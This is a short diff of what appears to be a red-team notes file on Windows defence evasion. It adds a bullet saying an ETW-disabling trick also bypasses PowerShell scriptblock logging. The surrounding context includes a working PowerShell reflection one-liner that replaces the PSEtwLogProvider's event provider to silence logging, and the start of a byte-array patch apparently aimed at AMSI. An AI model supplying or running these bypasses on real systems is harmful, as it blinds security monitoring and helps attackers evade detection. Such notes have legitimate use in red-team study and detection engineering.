@@ -203,6 +203,7 @@ $buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0
 - Event Tracing for Windows
 - Very effective way of hunting .NET
 - Reflectivly modify the PowerShell process to prevent events being published. ETW feeds ALL of the other logs so this disabled everything!
+- Also bypasses scriptblock logging
 
 ```
 [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static'); $EventProvider = New-Object System.Diagnostics.Eventing.EventProvider -ArgumentList @([Guid]::NewGuid()); $EtwProvider.SetValue($null, $EventProvider);
